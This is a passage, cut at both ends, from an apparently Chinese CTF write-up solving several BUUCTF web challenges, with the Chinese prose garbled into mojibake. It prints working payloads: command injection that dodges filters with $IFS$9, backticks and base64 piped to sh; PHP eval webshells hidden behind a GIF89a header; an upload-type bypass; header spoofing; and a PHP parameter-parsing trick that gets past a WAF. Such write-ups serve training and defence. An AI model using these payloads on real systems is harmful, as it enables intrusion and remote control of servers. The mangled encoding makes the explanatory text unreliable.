¼ï¼Œå¤§ä½¬è¯´åº”è¯¥æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†</p>\n<blockquote>\n<p>å‘½ä»¤ä¸­ç©ºæ ¼è¢«è¿‡æ»¤çš„è§£å†³æ–¹æ³•ï¼š<br/> <code>{cat,flag.txt}</code><br/> <code>cat${IFS}flag.txt</code><br/> <code>cat$IFS$9flag.txt</code>: <code>$IFS$9 $9æŒ‡ä¼ è¿‡æ¥çš„ç¬¬9ä¸ªå‚æ•°</code><br/> <code>cat&lt;flag.txt</code><br/> <code>cat&lt;&gt;flag.txt</code><br/> <code>kg=$'\\x20flag.txt'&amp;&amp;cat$kg</code><br/> <code>(\\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡)</code></p>\n</blockquote>\n<p>è¯•è¯•ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼š<code>/?ip=127.0.0.1|{cat,flag.php}</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\3e54247c99834e78b0b723c25577f054.png\"/>å‘ç°ç¬¦å·åˆè¢«è¿‡æ»¤äº†ï¼Œè¯´æ˜<code>{}</code>å¤§æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ç¬¬äºŒä¸ªä¸èƒ½ç”¨äº†<br/> è¯•è¯•ç¬¬ä¸‰ä¸ªæ–¹æ³•<code>/?ip=127.0.0.1|cat$IFS$9flag.php</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\24b05a13dae945ecb068beadf222a64d.png\"/>flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼</p>\n<p>ä¸æ˜¯æŸ¥å‡ºæ¥ä¸¤ä¸ªæ–‡ä»¶å˜›ï¼Œçœ‹çœ‹å¦ä¸€ä¸ªå§<br/> æŸ¥çœ‹index.phpæ–‡ä»¶ï¼š<code>/?ip=127.0.0.1|cat$IFS$9index.php</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\593bb0dc80dd4c96b211c05c135f56e8.png\"/>å‘ç°è¿™ä¸ªPHPä»£ç å¥½åƒä¸å¤ªå…¨ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æºç ï¼Œå‡ºæ¥äº†ï¼Œä¸‹é¢æ˜¯PHPä»£ç </p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n  <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{1f}]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your symbol!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ /\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your space!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/bash/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your bash!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/.*f.*l.*a.*g.*/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"fxck your flag!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ping -c 4 \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//æ‰§è¡Œæ“ä½œç¬¦ ï¼Œ-c 4 è¡¨ç¤ºpingçš„æŒ‡å®šæ¬¡æ•°ä¸º4</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre&gt;\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>ä»£ç å®¡è®¡ä¸€ä¸‹ï¼Œå¥½å¤šéƒ½è¢«è¿‡æ»¤äº†emmmï¼›ä½†æœ€åæœ‰ä¸ªå˜é‡aï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆåš<br/> ä¸ä¼šäº†ï¼Œå­¦ä¸€ä¸‹å¤§ä½¬çš„æ–¹æ³•å§</p>\n<ul><li> <p><strong>æ–¹æ³•ä¸€ï¼šå˜é‡æ‹¼æ¥å­—ç¬¦ä¸²â€”â€”å°†açš„å€¼è¦†ç›–ï¼Œç„¶åè¿›è¡Œç»•è¿‡</strong><br/> æ„é€ payloadï¼š<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code><br/> æ€»ä¹‹å°±æ˜¯ç”¨å˜é‡æ‹¼æ¥æˆflag<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\40caa8ed721e484895e7e01fc80309cd.png\"/>å•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç </p> <pre><code class=\"prism language-php\"><span class=\"token operator\">/</span><span class=\"token operator\">?</span>ip<span class=\"token operator\">=</span>\n<span class=\"token operator\">&lt;</span>pre<span class=\"token operator\">&gt;</span><span class=\"token constant\">PING</span> <span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token operator\">.</span><span class=\"token function\">1 </span><span class=\"token punctuation\">(</span><span class=\"token number\">127.0</span><span class=\"token number\">.0</span><span class=\"token number\">.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token number\">56</span> data bytes\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">php</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag{af15354a-6bdf-4609-b230-75bdc03e1dbf}\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre> <p>æ‹¿åˆ°flag~~</p> </li><li> <p><strong>æ–¹æ³•äºŒï¼šå†…è”æ‰§è¡Œ</strong><br/> <em>å†…è”å‡½æ•°ï¼šå°†æŒ‡å®šçš„å‡½æ•°ä½“æ’å…¥å¹¶å–ä»£æ¯ä¸€å¤„è°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ã€‚</em></p> <p>åå¼•å·åœ¨linuxä¸­ä½œä¸ºå†…è”æ‰§è¡Œï¼Œæ‰§è¡Œè¾“å‡ºç»“æœã€‚ä¹Ÿå°±æ˜¯è¯´</p> <p><code>cat `ls` //æ‰§è¡Œlsè¾“å‡º index.php å’Œ flag.php ã€‚ç„¶åå†æ‰§è¡Œ cat flag.php;cat index.php</code></p> <p>æ„é€ payload <code>/?ip=127.0.0.1;cat$IFS$9`ls`</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d5d5c5b8c8e2483284e930683ad96b5d.png\"/><br/> <strong>æ–¹æ³•ä¸‰ï¼šshå‘½ä»¤æ¥æ‰§è¡Œ</strong><br/> ä½¿ç”¨ base64 ç¼–ç çš„æ–¹å¼æ¥ç»•è¿‡ flag è¿‡æ»¤ã€‚</p> <p>åŠ å¯†å‘½ä»¤<br/> echo â€œcat flag.phpâ€ | base64<br/> è§£å¯†å‘½ä»¤å¹¶æ‰§è¡Œ<br/> echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</p> </li></ul>\n<p>ç„¶åç”¨<code>$IFS$9</code>ä»£æ›¿ç©ºæ ¼ã€‚<br/> æ„é€ payloadï¼š<code>/?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\43c002c2ec85445fbc183f3421c4e3c0.png\"/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019Knife_438\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c192d42aed4a4091add50df10fe271fc.png\"/>å¾ˆæ˜æ˜¾çš„æç¤ºï¼Œç”¨ä¸­å›½èœåˆ€æˆ–è€…èšå‰‘ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨èšå‰‘</p>\n<p>æ„é€ payloadï¼š<code>/?&lt;?php eval($_POST[\"Syc\"]);?&gt;</code></p>\n<p>æ‰“å¼€èšå‰‘æ·»åŠ æ•°æ®<br/> URLåœ°å€ä¸ºï¼šhttp://094fc751-45ef-4f6e-961d-daee474ee7b4.node4.buuoj.cn/index.php<br/> å¯†ç ä¸ºï¼šSyc<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\905569a67133418784ebbc34582c57c5.png\"/></p>\n<p>ç”¨èšå‰‘æŸ¥çœ‹ç›®å½•<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6398a316d8c14c15bf8e8facf581d371.png\"/>æŸ¥çœ‹æ ¹ç›®å½•ï¼Œæ‰¾åˆ°flag<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2f937a03e2e54a94bb779094a36e902b.png\"/>è¿›å…¥flagæ–‡ä»¶å¤¹é‡Œ<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ee302be88fdc492389c20462d46e938d.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019Http_455\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\a246a301fb61498996f7878ef00e3e3f.png\"/><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b20471a05d9845329610d21064051c53.png\"/></p>\n<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ‰ä¸€ä¸ªSecret.php<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\147d713e9060458397dc1844a629b8d3.png\"/></p>\n<p>è¿›å…¥è¿™ä¸ªè®¿é—®è¯¥ç›®å½•<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\2807fcf12e604ac8aa1d3bd0fcc79690.png\"/>æç¤ºï¼šIt doesnâ€™t come from â€˜https://www.Sycsecret.comâ€™ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªé¡µé¢å¾—æ¥è‡ªhttps://www.Sycsecret.comï¼Œæ·»åŠ refererå³å¯</p>\n<blockquote>\n<p>Refererå¤´ç”¨äºå‘Šè¯‰webæœåŠ¡å™¨ï¼Œç”¨æˆ·æ˜¯ä»å“ªä¸ªé¡µé¢æ‰¾è¿‡æ¥çš„</p>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5b8617e198ab4177a2d43a98acbc782f.png\"/><br/> æç¤ºPlease use â€œSycloverâ€ browserï¼šè¯·ä½¿ç”¨â€œSycloverâ€æµè§ˆå™¨<br/> æ·»åŠ <code>User-Agent:Syclover</code></p>\n<blockquote>\n<p>User-Agentå¤´ç”¨äºå‘Šè¯‰webæœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨çš„æµè§ˆå™¨å’Œæ“ä½œç³»ç»Ÿä¿¡æ¯</p>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\662ba42467734a26930bf3c69e3648ab.png\"/>æç¤ºNo!!! you can only read this locally!!!ï¼šä¸! !æ‚¨åªèƒ½åœ¨æœ¬åœ°é˜…è¯»!!<br/> æ·»åŠ <code>X-Forwarded-For:127.0.0.1</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8021c8109b694a1388b1ac2c28d4d9bc.png\"/>æ‹¿åˆ°flag~~</p>\n<h1><a id=\"RoarCTF_2019Easy_Calc_474\"></a>[RoarCTF 2019]Easy Calc</h1>\n<p>å¯¹æˆ‘æ¥è¯´æ˜¯ä¸€é“éš¾é¢˜ï¼Œä¸è¿‡åˆå­¦åˆ°å¥½å¤š<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e766f79ead5c445bba13a7644abf19a2.png\"/><br/> æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b2d3c021703f4fecaa59af629b9a68ef.png\"/><br/> æŠ“åŒ…<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\dfe85822fe5c41909b261de02ebb47bd.png\"/>å‘ç°calc.phpï¼Œè®¿é—®ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6650ba9b1c954bf1b9d233ed7e9606d9.png\"/>æœ‰ä¸ªé»‘åå•</p>\n<p><em>OKOKï¼Œä¸Šé¢æ˜¯æˆ‘æ‰€æœ‰æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œç„¶åæºç æœ‰éƒ¨åˆ†ä¹Ÿçœ‹ä¸æ‡‚ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆä¸‹æ‰‹ï¼Œç”šè‡³è¿˜ä¸çŸ¥é“è¿™æ˜¯ä¸ªä»€ä¹ˆç±»å‹çš„é¢˜ç›®ï¼Œä¸‹é¢å¼€å§‹å­¦ä¹ å¤§ä½¬</em></p>\n<blockquote>\n<p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p>\n<ul><li><strong>chr() å‡½æ•°</strong>ï¼šä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½®0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚</li><li><strong>file_get_contents() å‡½æ•°</strong>ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚</li><li><strong>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</strong>ï¼šPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘ã€‚å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</li><li><strong>scandir() å‡½æ•°</strong>ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</li></ul>\n</blockquote>\n<p>æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ece04c7470ec4f4c9eb1048910d1a50a.png\"/><br/> $(\"#content\").val()ç›¸å½“äº document.getElementById(â€œcontentâ€).value;</p>\n<ul><li> <p><strong>æ–¹æ³•ä¸€ï¼šPHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</strong><br/> å°è¯•ä¸€ä¸‹<code>/calc.php?num=phpinfo()</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6b370a245e094589b792bd903574b234.png\"/></p>\n<blockquote>\n<p><strong>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</strong>ï¼šPHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘ã€‚å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p>\n</blockquote> <p>numå‰åŠ ä¸ªç©ºæ ¼ï¼š<code>/calc.php? num=phpinfo()</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\33fe1aff6ab240068e2176d8d188297e.png\"/><br/> ç”±äºâ€œ/â€è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨chr(47)æ¥è¿›è¡Œè¡¨ç¤ºï¼Œè¿›è¡Œç›®å½•è¯»å–ï¼š<br/> <code>calc.php? num=1;var_dump(scandir(chr(47)))</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\152de556bf404cb0b5a22ff12597f153.png\"/><br/> æ„é€ ï¼š<code>/flagg</code>â€”â€”<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br/> payloadï¼š<code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\0d35e2e16f0244b3bb1bab2d84d73212.png\"/></p> </li><li> <p><strong>æ–¹æ³•äºŒï¼šhttpèµ°ç§æ”»å‡»</strong><br/> æ„é€ ï¼š<code>/flagg</code>â€”â€”<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br/> payloadï¼š<code>/calc.php?num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\7262ebf7d2ec462b9114449fb9750e2e.png\"/></p> </li></ul>\n<h1><a id=\"_2019Upload_512\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c92eb0f8fc4443b4a172a140b71bac15.png\"/><br/> åˆ›å»ºä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œä»¥ä¾¿åç»­ç”¨èšå‰‘é“¾æ¥<br/> æ–‡ä»¶å†…å®¹ä¸º</p>\n<pre><code>GIF89a\n&lt;script language=\"php\"&gt;eval($_POST['a']);&lt;/script&gt; \n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c9a21f32e18c4cf69338a949d5397942.png\"/>å¯ç»•è¿‡çš„åç¼€åæ£€æµ‹ï¼š<code>php,php3,php4,php5,phtml.pht</code></p>\n<p>ä¸Šä¼ æ­¤æ–‡ä»¶ï¼Œç„¶åæç¤º<code>Not image!</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\70bcb88198a9439e8b45d817a7ba1324.png\"/></p>\n<p>ç”¨burpsuiteæŠ“åŒ…ï¼Œæ ¹æ®æç¤ºï¼Œä¿®æ”¹<code>Content-Type</code>çš„å†…å®¹ä¸º <code>image/jpeg</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\39a394f9fa52438ebc022c086f08f8c0.png\"/></p>\n<p>URLåœ°å€ä¸ºï¼š<code>/upload/a.phtml</code><br/> è¿æ¥å¯†ç ä¸ºï¼š<code>a</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\43f1dd5f806d4d40aea2a048d87056a1.png\"/></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\b0f11a1c724d4ab8bb4e2727584e0106.png\"/><br/> æ‰¾åˆ°flagæ–‡ä»¶<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e79959c78b424a598c13a31682d180e5.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\17f14af3f7744873bb452a28ed9a2a80.png\"/><br/> æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019PHP_538\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119334169\">å…·ä½“çŸ¥è¯†ç‚¹ç‚¹è¿™é‡Œ</a><br/> <strong>é¢˜ç›®ç±»å‹ï¼šåºåˆ—åŒ–ä¸ååºåˆ—åŒ–</strong></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9862e1ca87ba4ba9b9afd0101f92ec6a.png\"/><br/> è¿™å„¿æç¤ºå¤‡ä»½ç½‘ç«™ï¼Œç”¨<a href=\"https://www.cnblogs.com/wuhongbin/p/14048052.html\">dirsearch</a>æ‰«ä¸€ä¸‹åå°ç›®å½•<br/> è¾“å…¥ï¼š<code>python dirsearch.py -u http://9b76aef7-3183-4da4-a909-0f95ad5b6607.node4.buuoj.cn -e php</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8b70f7b43a564e03bd0ffe43cdd20d33.png\"/><br/> æ‰¾åˆ°www.zipï¼Œè®¿é—®ä¸€ä¸‹<img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5bb7833a01f64a36b7fd905609a12acf.png\"/><br/> è·³å‡ºå¼¹çª—ï¼Œç‚¹å‡»ä¸‹è½½</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\da2c917bd6584a88b8005e376fa24663.png\"/><br/> å‘ç°æœ‰flag.phpç›®å½•<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\360f0b284d2045bfbf50b239a8dde7b5.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Syc{dog_dog_dog_dog}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token 